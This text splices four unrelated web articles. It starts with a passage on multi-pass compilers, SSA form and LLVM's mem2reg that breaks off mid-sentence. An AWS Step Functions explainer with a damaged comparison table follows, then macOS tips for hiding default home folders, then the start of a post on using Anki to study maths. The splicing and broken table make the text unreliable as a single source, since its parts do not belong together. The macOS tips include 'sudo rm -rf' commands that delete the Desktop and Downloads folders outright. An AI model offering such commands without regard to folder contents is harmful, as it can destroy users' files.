is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ol>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
<span>entry:</span>

  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>%spec.select</span><span>,</span> <span>i32</span> <span>420</span><span>)</span> <span>#4</span><span>,</span> <span>!dbg</span> <span>!22</span>
  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<p>So we need a better example. Let’s do something that LLVM can’t trivially optimize into a
<code>select</code> (or sequence of <code>select</code>s), like adding an <code>else if</code> with a function that we’ve …</p></div>

                        <p>The use of serverless computing has become a must nowadays, and some of you may already know a thing or two about Amazon Web Services like <a href="https://dashbird.io/knowledge-base/aws-lambda/introduction-to-aws-lambda/">Lambda Functions</a>, Step Functions, and other services AWS provides. However, if this is the first time you hear about them – fantastic!</p>
<p>In this article, we’ll discuss AWS Step Functions, what they are used for, how to use them, and the advantages or disadvantages that they bring.</p>
<h2><span><b>AWS Step Functions 101</b></span></h2>
<p>Before we can jump into Step Functions, you need to familiarize yourself with the basic structure behind them. Step Functions are an AWS-managed service that uses <a href="https://dashbird.io/knowledge-base/well-architected/finite-state-machine/">Finite-State Machine (FSM)</a> model.</p>
<p><em>Why is that important?</em></p>
<p>By coordinating multiple AWS services into different serverless workflows, you can quickly build and update the apps. Additionally, with Step Functions, you’ll be able to both design and run workflows that’ll bring together various services, including Amazon ECS and AWS Lambda, into feature-rich applications.</p>
<h2><b>FSM Model Explained</b></h2>
<p>The two keywords you need to remember are States and Transitions.</p>
<p><em>Now, why are these words so important?</em></p>
<p>FSM model does a simple job – it uses given states and transitions to complete the tasks at hand. Finite-State Machines are also known as a behavioral model. It’s an abstract machine (system) that can be in 1 (one) state at a time, but it can also switch between a finite number of states.</p>
<p>This machine is defined solely by its states and the relationship these states have between themselves. A good and very straightforward example is the “closed-door example.” The door can either be open or closed, and these are the only two possible states. Now, the transition part is the switch between two states, but you need to provide some input first to get there. When you close the door, you’re placing an input. Additionally, the sequence of opening the closed door is known as the switch between two states (transition).</p>
<figure id="attachment_2958" aria-describedby="caption-attachment-2958"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-1024x626.png" alt="StepFunctions state input and transition" width="640" height="391" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-1024x626.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-300x183.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-768x469.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00.png 1162w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2958"><em>StepFunctions state input and transition</em></figcaption></figure>

<p>You can also apply the same thing to other examples, like your daily life routines. Let’s take “Work, home, bed” as states. From work (state), you take a bus (input) to get home (state), and when you arrive home, you go to bed (another input leading to another state). Tomorrow morning when you wake up and get out of your bed, you’re transitioning from the last state you were in into a previous one, and yet again, taking the bus from home to work is one more transition.</p>
<p>There are other, more complex examples with many more states, inputs, and transitions between them, and the more states you add, the more complex the FSM model becomes.</p>
<p>The conclusion is simple – FSMs are a method of modeling your system by defining the states and transitions between those states.</p>
<h2><span><b>What Are Step Functions?</b></span></h2>
<p>Step Functions are Amazon’s Finite-State Machines service that’s entirely managed while also being serverless. Step Functions are made of state machines (workflows) and tasks. Tasks are individual states or single units of work.</p>
<p>In the following graph, you’ll see an example of Amazon’s State Machine in which the green rectangles represent the states. The result leads to another state, which then leads to the choice that depends on the given input (email or SMS). In this example, the green states were successfully executed, while the white-colored state wasn’t.</p>
<figure id="attachment_2959" aria-describedby="caption-attachment-2959"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-1024x853.png" alt="Amazon's state machine" width="640" height="533" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-1024x853.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-300x250.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-768x640.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03.png 1152w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2959"><em>Amazon’s state machine</em></figcaption></figure>

<p>This entire graph representing the state machine is also known as a Workflow, and there are two types of workflows available.</p>
<h2><span><b>Step Function Workflow</b></span></h2>
<h3><b>Types Of Workflows</b></h3>
<p>Workflows are divided into two groups: Standard and Express workflow. Unlike Standard, the Express workflow is a relatively new option that has been available since last year. The table below shows the differences between these two workflow types.</p>
<table>
<tbody>
<tr>
<td>
<p><b>Workflows</b></p>
</td>
<td>
<p><b>Standard</b></p>
</td>
<td>
<p><b>Express</b></p>
</td>
</tr>
<tr>

</td>

<p>1 year</p>
</td>
<td>
<p>5 minutes</p>
</td>

<tr>

</td>

<p>100.000+</p>
</td>

<tr>
<td>
<p><b>State Transitions</b></p>
</td>
<td>
<p>4000+</p>
</td>
<td>
<p>Unlimited</p>
</td>
</tr>
<tr>
<td>
<p><b>Price</b></p>
</td>
<td>
<p>Per state transition</p>
</td>
<td>
<p>Number of executions, duration &amp; memory</p>
</td>
</tr>
<tr>
<td>
<p><b>Execution</b></p>
</td>
<td>
<p>Exactly once</p>
</td>
<td>
<p>At least once</p>
</td>
</tr>
<tr>
<td>
<p><b>Execution History</b></p>
</td>
<td>
<p>API, AWS Console or CloudWatch</p>
</td>
<td>
<p>CloudWatch</p>
</td>
</tr>
</tbody>
</table>

<p>State machines orchestrate the work of Lambda functions. When one function ends, it triggers another function to begin. Although Max Duration is significantly different, Express workflow allows more scalability. Moreover, Express workflow pricing is constructed with more details since users will have to pay for the number of executions, including the duration and memory used for those executions. Standard workflow pricing requires users to pay only for each state transition that occurs.</p>
<p>It’s important to note that Standard workflow is a long-running workflow that has to be durable and auditable. In contrast, the Express workflow type is needed for a much higher workflow and event processing volume.</p>
<h3><b>Workflow Execution</b></h3>
<p>Now that you know the basics, the next step of the way is the execution. To trigger the workflow to start the execution against Step Function API, you can use CloudWatch events as a time trigger or use API Gateway as a proxy.</p>
<h3><span><b>State Types</b></span></h3>
<p>It’s essential to remember that States aren’t the same thing as Tasks since Tasks are one of the State types. There are numerous State types, and all of them have a role to play in the overall workflow:</p>
<ul>
<li>Pass: Pushes input to output.</li>
<li>Task: Takes input and produces output.</li>
<li>Choice: Allows the user to use Branching Logic that’s based on the input.</li>
<li>Wait: It adds delays to State Machine execution.</li>
<li>Success: Has an expected dead-end that stops execution successfully.</li>
<li>Fail: Has an expected dead-end that stops execution with a failure.</li>
<li>Parallel: Allows a user to implement parallel branches in execution, meaning the user can start multiple states at once.</li>
<li>(Dynamic) Mapping: Runs a set of steps for every input item.</li>
</ul>
<h3><span><b>Tasks</b></span></h3>
<p>Tasks are the leading States in which all the work is done. Tasks can call Activities (remote executions):</p>
<ul>
<li>Call an execution on either ECS, EC2 machines, or mobile devices.</li>
<li>Sending SMS notifications and wait for the input.</li>
</ul>
<p>Another constructive element that Step Functions Tasks provide is that it allows you to reach out from your AWS space.</p>
<h3><span><b>Error Handling</b></span></h3>
<p>Error handling includes retries and catch. An excellent example of how does Step Functions work is shown in the graph below:</p>
<figure id="attachment_2960" aria-describedby="caption-attachment-2960"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-1024x882.png" alt="Step Function visual workflow" width="640" height="551" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-1024x882.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-300x258.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-768x661.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21.png 1110w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2960"><em>Step Function visual workflow</em></figcaption></figure>

<p>In this example, you can see the Parallel branching task. This task is a perfect example representing how the entire execution will fail if only one state encounters an error.</p>
<p>Users are provided with Amazon State Language that helps them catch those errors and define all the retries. All this is extremely important for business-critical operations.</p>
<p>Amazon State Language allows you to place a comment, define when the state should start, and define the states and tasks. Moreover, suppose a customer handled an error. In that case, this tool allows you to specify the retries based on the error name, but also to specify the retry interval, as well as the number of retry maximum attempts, and backoff rate, which you can see in the example below:</p>
<figure id="attachment_2961" aria-describedby="caption-attachment-2961"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.23.22-1024x446.png" alt="Amazon State Language: Error handling example" width="640" height="279" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.23.22-1024x446.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.23.22-300x131.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.23.22-768x334.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.23.22.png 1162w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2961"><em>Amazon State Language: Error handling example</em></figcaption></figure>

<p>In case you wish to catch errors, you’ll see why some states weren’t executed and which tasks have failed. See an example of how to catch an error in the graph below:</p>
<figure id="attachment_2962" aria-describedby="caption-attachment-2962"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.28.06-1024x448.png" alt="Amazon State Language: Catch Errors example" width="640" height="280" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.28.06-1024x448.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.28.06-300x131.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.28.06-768x336.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.28.06.png 1166w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2962"><em>Amazon State Language: Catch Errors example</em></figcaption></figure>

<p>The first retry attempt will start at the pre-determined interval, and it gets multiplied by the backoff rate you’ve set.</p>
<p>Error handling is critical because if Parallel tasks execute successfully, but one fails, the entire execution will fail. However, even if the entire execution fails, the state changes will remain intact.</p>
<p>Error handling allows you to track everything that’s happened in the log, and by doing so, you’ll have a better insight on why some errors happened so you could handle the core problem.</p>
<h2><span><b>Step Function Demonstration</b></span></h2>
<h3><b>Choice Step Function Example</b></h3>
<p>You’ll have to input a preferred number into your function. For example, if you chose a number 10 and a customer buys more than ten items from you, the Step Function will execute successfully by following a preferred choice. In case a customer buys less than ten items, the execution will also be successful, but under a different pre-set choice.</p>
<h3><b>Retry Step Function Example</b></h3>
<p>It’s required that you specify the number of retries for all errors and define the interval, along with the number of maximum attempts. There you’ll see that it’s retrying to execute the function until it finally fails.</p>
<p>When the execution fails, you can check the logs in the Execution Event History tab to see how many times it started, but you’ll also be able to see the retries in between each start. You can access detailed information by following the CloudWatch logs link within the Event History tab.</p>
<h3><b>Catch Step Function Example</b></h3>
<p>Input a specific number range, and the function will execute based on the pre-set number. If the execution number goes outside the pre-set number range, the function will report a Range Error. However, if the number goes below the minimal pre-set number higher than zero, the function will report a Custom Error.</p>
<p>Error catch and error handling are essential for Step Functions since it allows for a successful, and error-free function execution.</p>

<p>Step Functions Standard workflow is excellent for business-critical workflows and brings along <a href="https://dashbird.io/knowledge-base/step-functions/why-use-step-functions/">numerous business benefits</a>. It provides much better error handling logic that Lambda Functions, while it’s relatively easy to orchestrate them. On the other hand, it’s meant more for business-critical ones since it pretty expensive compared to Express workflow. The Standard workflow price is USD$25 per one million executions with the additional cost for memory and duration of use.

<p>Apple computers ship with a custom operating system - macOS, which has a few annoying features.
Among the annoyances a special place has to be reserved for the inability to remove or rename the folders located in <code>$HOME</code>.
Here I describe my way of dealing with this problem.</p>

<h2 id="hidingdefaultfolders">Hiding default folders</h2>

<p>On the web countless macOS users are looking for answers to the same question: “How can I get rid of ‘Desktop’, ‘Documents’, ‘Downloads’, ‘Library’, ‘Movies’, ‘Music’, ‘Pictures’, and ‘Public’ folders?”
Multiple suggestions are provided as possible solutions.
You can: replace the folders with files<a href="#fn:1" id="fnref:1" title="see footnote"><sup>○</sup></a>; hide the folders from ‘Finder’ and make them inaccessible<a href="#fn:2" id="fnref:2" title="see footnote"><sup>○</sup></a>; or simply learn to live with them, as the system will recreate those folders by itself anyway<a href="#fn:3" id="fnref:3" title="see footnote"><sup>○</sup></a>.</p>

<p>I decided to hide.
But, when working in the command line, hiding these folders from Finder is not enough.
Below are three settings that, while not covering all corner cases, go a long way.</p>

<ol>
<li><p>hide from <code>Finder</code> by adding a hidden flag</p>

<pre><code>chflags hidden ~/Desktop ~/Documents ~/Downloads ~/Library
chflags hidden ~/Movies ~/Music ~/Pictures ~/Public
</code></pre></li>
<li><p>hide from <code>ls</code> by creating an alias in <code>.bashrc</code></p>

<pre><code>alias ls='ls -I Desktop -I Documents -I Downloads -I Library\
             -I Movies -I Music -I Pictures -I Public'
</code></pre></li>
<li><p>hide from tab completion by setting a special bash <code>FIGNORE</code><a href="#fn:4" id="fnref:4" title="see footnote"><sup>○</sup></a> variable.</p>

<pre><code>export FIGNORE=Desktop:Documents:Downloads:Library:Movies:Music:Pictures:Public
</code></pre></li>
</ol>

<p>That is it, the folders should mostly be out of view.
And if for whatever reason we need to temporary see them again a simple <code>\ls</code> would bypass the alias and provide us the full list.</p>

<h2 id="creatinganewhierarchy">Creating a new hierarchy</h2>

<p>With the folders out of view we can now move onto creating our own home hierarchy.
This part mostly depends on the needs of the user.
But I would like to offer one piece of advice: make sure your folders start with unique lowercase letters.
This will allow you to auto-complete folder names after typing a single character and offer extra protection against invoking a command on one of those default hidden folders, that start with upper case letters.</p>

<p>In my case the new hierarchy looks like this:</p>

<pre><code>├── base
│   ├─── bin
│   ├─── etc
│   ├─── src
│   └─── var
│
├── desk
│
├── file
│   ├─── articles
│   ├─── books
│   ├─── documents
│   ├─── essays
│   ├─── photos
│   └─── videos
│
└── work
    ├─── active_project_one
    ├─── active_project_two
    └─── zzz
         ├─── inactive_project_one
         ├─── inactive_project_two
         ├─── inactive_project_three
         ├─── inactive_project_four
         └─── ...
</code></pre>

<p><code>'base'</code> is a substitute for <code>'.local'</code>.<br>
<code>'desk'</code> takes the place of the <code>'Desktop'</code> and <code>'Downloads'</code>.<br>
<code>'file'</code> is an aggregate of <code>'Documents'</code>, <code>'Music'</code>, <code>'Pictures'</code>, and <code>'Movies'</code>.<br>
<code>'work'</code> stores various active and completed projects.</p>

<h2 id="linkingdownloadsanddesktop">Linking Downloads and Desktop</h2>

<p>There is one detail remaining: macOS has a useful <code>'Desktop'</code> and now its hidden from us.
On top of that some third party applications put various acquired data into the <code>'Downloads'</code> folder.
Hence, we want to see the contents of those folders within our new file hierarchy.
We achieve this with symbolic links.</p>

<ol>
<li><p>make <code>'Desktop'</code> be a symbolic link for our new folder <code>'desk'</code></p>

<pre><code>sudo rm -rf Desktop
ln -s desk Desktop
</code></pre></li>
<li><p>make <code>'Downloads'</code> be a symbolic link for <code>'Desktop'</code></p>

<pre><code>sudo rm -rf Downloads
ln -s Desktop Downloads
</code></pre></li>
</ol>

<p>And now whenever a file is put into the, now hidden, <code>'Downloads'</code> or <code>'Desktop'</code> folders, it will be placed in our <code>'desk'</code> instead.
Moreover, since <code>'Desktop'</code> is a link to <code>'desk'</code>, whatever is put into the <code>'desk'</code> directory will be visible on the actual desktop on a screen.</p>

<h2 id="theresult">The result</h2>

<pre><code>$ ls ~/
base desk file work

$ cd ~/D&lt;tab&gt;
$ cd ~/D

$ cd ~/d&lt;tab&gt;
$ cd ~/desk
</code></pre>

<h2 id="summary">Summary</h2>

<p>Getting rid of default macOS home directories is hard.
Hiding, instead of trying to delete, seems like an easier and safer solution.
The tricks presented in this article, while not being 100% effective, go along way.
I’ve been using this approach for a few years without accidentally seeing any reminder of those folders during this whole time.</p>

        <p><em>Patrick Stevens is a Developer at G-Research.</em></p>
<p>TL;DR: <em>If you aren’t using <a href="https://apps.ankiweb.net/">Anki</a> or one of its siblings to remember what you learn, you are missing out on literal superpowers. There are specific techniques which I’ve found helpful for using it to learn maths and computer science in particular.</em></p>
<p>This post will discuss extremely briefly what Anki is, but is mainly aimed at helping the student of maths or computer science to squeeze out some extra droplets of productivity from it. If you aren’t already familiar with Anki, go and read Michael Nielsen’s post <a href="http://augmentingcognition.com/ltm.html">Augmenting Long-Term Memory</a> as well or instead of this one; if you’re short of time, the main value of the post to someone new to Anki is in the first one-eighth or so, up to but not including “Using Anki to thoroughly read a research paper in an unfamiliar field”. That essay gives a broad-strokes motivation for why one might want to use Anki at all. (Spoiler: it gives you a superhuman memory!)</p>
<h2 id="what-is-anki-">What is Anki?</h2>
<p><a href="https://apps.ankiweb.net/">Anki</a> is a <a href="https://en.wikipedia.org/wiki/Spaced_repetition">spaced repetition system</a>: essentially a program that shows you flashcards at intervals tailored to help you remember their contents. Such systems are based on the observation that while you can’t stop memories from decaying, repeated exposure makes the decay exponentially slower.</p>
<p>So while you need to rehearse a fact frequently when you first come to learn it, reviews can become very sparse very quickly without losing much of your hard-won memory.</p>
<p>Anki is only one such system; other implementations such as SuperMemo and Mnemosyne exist.<br>
There are also applications using the same principles for more specific goals; for example, Memrise is designed for language learning. This post is phrased in terms of Anki, because for historical reasons that’s the one I use.</p>

<p>I’ve placed this section at the start, because I believe that spaced repetition is genuinely a superpower that anyone can acquire. If I can’t hold your interest in this post, I encourage you to glance over these other resources in the hope that one of them does the trick!</p>
<ul>
<li><a href="http://augmentingcognition.com/ltm.html">Augmenting Long-Term Memory</a> –&nbsp; a brief introduction to various memory systems with a particular focus on Anki. The money quote: “Anki makes memory a choice”. If you choose to remember something, you can.</li>
<li><a href="https://quantum.country/">Quantum Country</a> – an introduction to quantum computation with integrated spaced-repetition flashcards, which comes with emailed reminders to use the site at intervals. Even if you have no interest in quantum computation, I recommend skimming at least the first bits of the site, so that you can see what really good flashcards based on a text can look like. (Note that some of its cards are not ideal; the site does sometimes fall into the “yes/no” pattern, with flashcards whose answer is a bald “yes” or “no”. Cards of this form aren’t as good as cards which get you to reproduce actually content-based parts of a fact.)</li>
<li><a href="https://www.supermemo.com/en/archives1990-2015/articles/20rules">The Twenty Rules of Formulating Knowledge in Learning</a> – the creator of the spaced-repetition system SuperMemo discusses how to formulate knowledge so that it sticks. Again, even if you don’t use spaced repetition, definitely read this; the advice is absolutely foundational to my understanding of how to learn. A nontrivial amount of this very blog post is essentially specialising some of these rules to the case of maths and computer science.</li>
<li><a href="https://www.reddit.com/r/medicalschoolanki/">Reddit: Medical School Anki</a>, a subreddit with almost 55,000 subscribers at the time of writing. This link is here just to demonstrate that there are fields (such as medicine) in which Anki is very popular and nowhere near as niche as it is in most areas.</li>
</ul>

